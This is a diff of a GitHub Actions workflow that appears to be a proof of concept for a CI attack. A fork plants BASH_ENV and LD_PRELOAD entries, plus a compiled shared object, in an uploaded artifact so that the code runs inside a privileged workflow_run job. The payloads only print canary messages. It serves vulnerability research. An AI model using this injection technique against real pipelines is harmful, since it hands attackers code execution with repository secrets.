@@ -30,19 +30,23 @@ jobs:
           W=/home/runner/work/ci-artifact-env-poc/ci-artifact-env-poc
           cat > ./env/env <<EOT
           PR_NUMBER=${{ github.event.number }}
-          POC_CANARY=injected-by-fork-Iradahkoreanway
-          NODE_OPTIONS=--require ${W}/poc-canary.js
+          POC_CANARY=fourth-pr-ld-preload
+          BASH_ENV=${W}/poc-bashenv.sh
+          LD_PRELOAD=${W}/poc.so
           EOT
-          cat > ./env/poc-canary.js <<'EOT'
-          console.log('[poc-canary] NODE_OPTIONS --require loaded this file inside the privileged '
-            + 'workflow_run job. repo=' + process.env.GITHUB_REPOSITORY
-            + ' ref=' + process.env.GITHUB_REF
-            + ' workflow=' + process.env.GITHUB_WORKFLOW);
+          cat > ./env/poc-bashenv.sh <<'EOT'
+          echo "[poc-bashenv] bash hook fired"
           EOT
+          cat > /tmp/poc.c <<'EOT'
+          #include <stdio.h>
+          __attribute__((constructor)) static void poc(void) {
+            fprintf(stderr, "[poc-ldpreload] shared object loaded into this process\n");
+          }
+          EOT
+          gcc -shared -fPIC -o ./env/poc.so /tmp/poc.c
           echo "--- artifact contents the fork is about to upload ---"
           cat ./env/env
-          echo "---"
-          cat ./env/poc-canary.js
+          ls -la ./env
 
       - uses: actions/upload-artifact@v4
         with:
